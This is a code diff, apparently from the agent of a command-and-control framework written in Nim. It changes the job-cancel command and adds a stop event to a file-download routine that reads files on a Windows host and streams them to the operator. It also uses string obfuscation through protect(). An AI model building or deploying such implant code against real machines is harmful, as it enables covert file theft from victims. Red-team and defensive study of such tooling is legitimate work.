@@ -142,7 +142,7 @@ commands[CMD_CANCEL] = proc(ctx: AgentCtx, task: Task): TaskResult =
         if not ctx.cancelJob(string.toUuid(jobId)):
             raise newException(CatchableError, protect("Job not found: ") & jobId)
 
-        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(protect("Job ") & jobId & protect(" cancelled.")))
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
     except CatchableError as err:
         return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
@@ -253,7 +253,7 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
 
     const DOWNLOAD_CHUNK_SIZE* = 512 * 1024
 
-    proc downloadProc(hWrite: HANDLE, task: Task) {.nimcall, gcsafe.} =
+    proc downloadProc(hWrite: HANDLE, hStopEvent: HANDLE, task: Task) {.nimcall, gcsafe.} =
         let filePath = absolutePath(Bytes.toString(task.args[0].data))
         
         let hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
@@ -261,15 +261,16 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
             return
         defer: CloseHandle(hFile)
 
-        var buf: array[DOWNLOAD_CHUNK_SIZE, byte]
-        while true:
-            var bytesRead: DWORD
-            if ReadFile(hFile, addr buf[0], DOWNLOAD_CHUNK_SIZE, 
-                addr bytesRead, nil) == FALSE or bytesRead == 0:
+        var buffer: array[DOWNLOAD_CHUNK_SIZE, byte]
+        while WaitForSingleObject(hStopEvent, 0) == WAIT_TIMEOUT:
+            var dwBytesRead: DWORD
+            if ReadFile(hFile, addr buffer[0], DOWNLOAD_CHUNK_SIZE, 
+                addr dwBytesRead, nil) == FALSE or dwBytesRead == 0:
                 break
-            var written: DWORD
-            if WriteFile(hWrite, addr buf[0], bytesRead, 
-                addr written, nil) == FALSE:
+            
+            var dwBytesWritten: DWORD
+            if WriteFile(hWrite, addr buffer[0], dwBytesRead, 
+                addr dwBytesWritten, nil) == FALSE:
                 break
 
     commands[CMD_DOWNLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
